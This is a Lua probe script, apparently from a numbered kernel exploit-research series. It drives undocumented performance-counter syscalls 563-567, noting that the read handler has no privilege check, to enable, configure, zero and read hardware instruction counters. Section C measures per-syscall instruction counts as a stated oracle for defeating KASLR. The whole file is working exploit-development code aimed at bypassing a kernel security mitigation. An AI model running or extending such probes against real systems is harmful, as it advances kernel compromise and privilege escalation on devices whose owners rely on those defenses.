-- CRASH_CLASS: LOW
-- PROBE 94a: PMU counter READ via sys 567 (CORRECT argument layout)
--
-- Context: The dead-end entry "sys 567 RDMSR read — returns -1" was tested
-- with WRONG arguments (MSR addresses as arg0). Handler analysis reveals
-- sys 567 takes: thread_id(uint32), counter_index(0-5), output_pointer(uint64*).
-- It resolves the thread via 0xb92420(tid, current_pid) and copies out one
-- uint64 saved counter value. No explicit priv_check in the handler.
--
-- Combined with sys 563-566 (PMU control, no credential for selector=0):
--   563: Enable PMU monitoring
--   565: Configure event selectors (retired instructions = 0xC0)
--   566: Write/zero counter values
--   567: READ counter values ← THIS IS THE MISSING PIECE
--
-- If this works, we have a COMPLETE hardware instruction counter:
-- enable → configure → zero → execute target → read = exact instruction count.
-- Different KASLR slides = different kernel instruction counts = KASLR defeat.
--
-- Section A: sys 567 with correct arg layout (TID + index + output ptr)
-- Section B: Full PMU cycle: enable → configure → zero → workload → read
-- Section C: KASLR fingerprinting via syscall instruction counts

local TEST_SECTION = TEST_SECTION or "C"

print("=== PROBE 94a: PMU COUNTER READ ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc563 = make_syscall(563)  -- enable PMU
local sc564 = make_syscall(564)  -- disable PMU
local sc565 = make_syscall(565)  -- configure event selector
local sc566 = make_syscall(566)  -- write counter value
local sc567 = make_syscall(567)  -- READ counter value
local sc624 = make_syscall(624)  -- VM op counter (baseline)
local sc432 = make_syscall(432)  -- thr_self (get current TID)
local sc20  = make_syscall(20)   -- getpid

if TEST_SECTION == "A" then
    print("--- Section A: sys 567 correct arg layout ---")
    print("")

    -- Get our TID and PID
    local tid_buf = memory.alloc(8)
    print("[A1] Getting current TID and PID:")
    local ok, pid = pcall(function() return sc20() end)
    print("  PID: " .. (ok and fmt(pid) or "FAIL"))

    -- thr_self returns TID via pointer arg
    safe_wq(tid_buf, uint64(0))
    ok, rv = pcall(function() return sc432(uint64(tid_buf)) end)
    local our_tid = safe_rd(tid_buf) or 0
    print("  thr_self ret: " .. (ok and fmt(rv) or "FAIL"))
    print("  TID: " .. our_tid)
    print("")

    -- Output buffer for counter value
    local out = memory.alloc(16)

    -- Test sys 567 with correct layout: tid, index, output_ptr
    print("[A2] sys 567 with TID=" .. our_tid .. ", index 0-5:")
    for idx = 0, 5 do
        safe_wq(out, uint64(0xDEADDEAD))  -- sentinel
        ok, rv = pcall(function()
            return sc567(uint64(our_tid), uint64(idx), uint64(out))
        end)
        local val = safe_rq(out)
        if ok then
            print(string.format("  index=%d: ret=%s val=%s%s",
                idx, fmt(rv), val and fmt(val) or "nil",
                to_num(rv) == 0 and " *** SUCCESS ***" or ""))
        else
            print(string.format("  index=%d: PCALL-FAIL", idx))
        end
    end
    print("")

    -- Test with TID=0 (might mean "current thread" in some ABIs)
    print("[A3] sys 567 with TID=0, index=0:")
    safe_wq(out, uint64(0xDEADDEAD))
    ok, rv = pcall(function()
        return sc567(uint64(0), uint64(0), uint64(out))
    end)
    local val = safe_rq(out)
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
    print("  val=" .. (val and fmt(val) or "nil"))
    print("")

    -- Test with PID as TID (might work if single-threaded)
    if ok == false or to_num(rv) ~= 0 then
        print("[A4] sys 567 with TID=PID, index=0:")
        safe_wq(out, uint64(0xDEADDEAD))
        ok, rv = pcall(function()
            return sc567(uint64(to_num(pid)), uint64(0), uint64(out))
        end)
        val = safe_rq(out)
        print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        print("  val=" .. (val and fmt(val) or "nil"))
        print("")
    end

    -- Test with invalid index (6, expect EINVAL=22)
    print("[A5] sys 567 with TID=" .. our_tid .. ", index=6 (expect EINVAL):")
    ok, rv = pcall(function()
        return sc567(uint64(our_tid), uint64(6), uint64(out))
    end)
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))

    -- Test with invalid TID (99999, expect ESRCH=3)
    print("[A6] sys 567 with TID=99999, index=0 (expect ESRCH):")
    ok, rv = pcall(function()
        return sc567(uint64(99999), uint64(0), uint64(out))
    end)
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))

    print("")
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: Full PMU cycle — enable/configure/zero/workload/read ---")
    print("")

    -- Get TID
    local tid_buf = memory.alloc(8)
    safe_wq(tid_buf, uint64(0))
    pcall(function() sc432(uint64(tid_buf)) end)
    local our_tid = safe_rd(tid_buf) or 0
    print("[B0] TID: " .. our_tid)
    local out = memory.alloc(16)
    print("")

    -- Step 1: Disable PMU (clean state)
    print("[B1] Disable PMU (clean state):")
    local ok, rv = pcall(function() return sc564(uint64(0)) end)
    print("  ret=" .. (ok and fmt(rv) or "FAIL"))

    -- Step 2: Configure index 0 for retired instructions (event 0xC0)
    print("[B2] Configure index 0 = retired instructions (0xC0):")
    ok, rv = pcall(function() return sc565(uint64(0), uint64(0), uint64(0xC0)) end)
    print("  ret=" .. (ok and fmt(rv) or "FAIL"))

    -- Step 3: Zero counter 0
    print("[B3] Zero counter 0:")
    ok, rv = pcall(function() return sc566(uint64(0), uint64(0), uint64(0)) end)
    print("  ret=" .. (ok and fmt(rv) or "FAIL"))

    -- Step 4: Read counter BEFORE enable (should be 0)
    print("[B4] Read counter 0 BEFORE enable:")
    safe_wq(out, uint64(0xDEADDEAD))
    ok, rv = pcall(function()
        return sc567(uint64(our_tid), uint64(0), uint64(out))
    end)
    local val = safe_rq(out)
    print("  ret=" .. (ok and fmt(rv) or "FAIL") .. " val=" .. (val and fmt(val) or "nil"))

    -- Step 5: Enable PMU
    print("[B5] Enable PMU:")
    ok, rv = pcall(function() return sc563(uint64(0)) end)
    print("  ret=" .. (ok and fmt(rv) or "FAIL"))

    -- Step 6: Execute workload (100 sys 624 calls)
    print("[B6] Executing 100 sys 624 calls as workload...")
    for i = 1, 100 do
        pcall(function() sc624() end)
    end

    -- Step 7: Read counter AFTER workload
    print("[B7] Read counter 0 AFTER workload:")
    safe_wq(out, uint64(0xDEADDEAD))
    ok, rv = pcall(function()
        return sc567(uint64(our_tid), uint64(0), uint64(out))
    end)
    val = safe_rq(out)
    print("  ret=" .. (ok and fmt(rv) or "FAIL") .. " val=" .. (val and fmt(val) or "nil"))
    if ok and to_num(rv) == 0 and val then
        local vh, vl = get_hi_lo(val)
        if vl > 0 or vh > 0 then
            print("  *** COUNTER IS COUNTING! ***")
            print("  instructions per 100 syscalls: ~" .. vl)
        end
    end

    -- Step 8: Zero counter again and measure different workload
    print("[B8] Zero + measure 10 sys 624 calls:")
    pcall(function() sc566(uint64(0), uint64(0), uint64(0)) end)
    for i = 1, 10 do pcall(function() sc624() end) end
    safe_wq(out, uint64(0xDEADDEAD))
    ok, rv = pcall(function()
        return sc567(uint64(our_tid), uint64(0), uint64(out))
    end)
    val = safe_rq(out)
    print("  ret=" .. (ok and fmt(rv) or "FAIL") .. " val=" .. (val and fmt(val) or "nil"))
    if ok and to_num(rv) == 0 and val then
        local vh, vl = get_hi_lo(val)
        if vl > 0 then
            print("  instructions per 10 syscalls: ~" .. vl)
            print("  *** LINEAR SCALING = HARDWARE COUNTER CONFIRMED ***")
        end
    end

    -- Step 9: Disable PMU
    print("[B9] Disable PMU:")
    pcall(function() sc564(uint64(0)) end)

    -- Step 10: Read all 6 counters
    print("[B10] Read all 6 counters (disabled state):")
    for idx = 0, 5 do
        safe_wq(out, uint64(0xDEADDEAD))
        ok, rv = pcall(function()
            return sc567(uint64(our_tid), uint64(idx), uint64(out))
        end)
        val = safe_rq(out)
        print(string.format("  idx=%d: ret=%s val=%s", idx,
            ok and fmt(rv) or "FAIL", val and fmt(val) or "nil"))
    end

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: KASLR fingerprinting via instruction counts ---")
    print("")

    -- If PMU read/write works, we can fingerprint kernel code paths.
    -- Different syscalls execute different numbers of instructions.
    -- The exact count depends on the code path, which depends on KASLR slide.
    -- By measuring instruction counts for multiple syscalls across connections,
    -- we can build a KASLR oracle.

    local tid_buf = memory.alloc(8)
    safe_wq(tid_buf, uint64(0))
    pcall(function() sc432(uint64(tid_buf)) end)
    local our_tid = safe_rd(tid_buf) or 0
    print("[C0] TID: " .. our_tid)
    local out = memory.alloc(16)

    -- Setup: enable + configure retired instructions
    pcall(function() sc564(uint64(0)) end)
    pcall(function() sc565(uint64(0), uint64(0), uint64(0xC0)) end)
    pcall(function() sc563(uint64(0)) end)

    -- Measure instruction counts for different syscalls
    local test_syscalls = {
        {20, "getpid"},
        {624, "vm_counter"},
        {202, "sysctl"},
        {477, "mmap"},
        {563, "pmu_enable"},
        {564, "pmu_disable"},
        {587, "credential_meta"},
    }

    print("[C1] Instruction counts per syscall (3 samples each):")
    for _, sc_info in ipairs(test_syscalls) do
        local sc_num, sc_name = sc_info[1], sc_info[2]
        local sc_test = make_syscall(sc_num)
        print(string.format("  sys %d (%s):", sc_num, sc_name))

        local counts = {}
        for trial = 1, 3 do
            -- Zero counter
            pcall(function() sc566(uint64(0), uint64(0), uint64(0)) end)
            -- Execute target syscall
            pcall(function()
                if sc_num == 477 then
                    sc_test(uint64(0), uint64(0x4000), uint64(3),
                            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
                elseif sc_num == 202 then
                    local mib = memory.alloc(8)
                    safe_wd(mib, 1)
                    safe_wd(mib + 4, 37)
                    sc_test(uint64(mib), uint64(2), uint64(0), uint64(0),
                            uint64(0), uint64(0))
                else
                    sc_test(uint64(0))
                end
            end)
            -- Read counter
            safe_wq(out, uint64(0))
            pcall(function()
                sc567(uint64(our_tid), uint64(0), uint64(out))
            end)
            local val = safe_rq(out)
            local vh, vl = 0, 0
            if val then vh, vl = get_hi_lo(val) end
            counts[trial] = vl
            print(string.format("    trial %d: %d instructions", trial, vl))
        end

        -- Check stability (jitter)
        if counts[1] > 0 and counts[2] > 0 then
            local jitter = math.abs(counts[1] - counts[2])
            print(string.format("    jitter: %d (%.1f%%)", jitter,
                counts[1] > 0 and (jitter / counts[1] * 100) or 0))
            if jitter == 0 then
                print("    *** ZERO JITTER = DETERMINISTIC COUNTER ***")
            end
        end
    end

    -- Cleanup
    pcall(function() sc564(uint64(0)) end)

    print("")
    print("[DONE] Section C complete")
end

print("")
print("=== PROBE 94a COMPLETE ===")

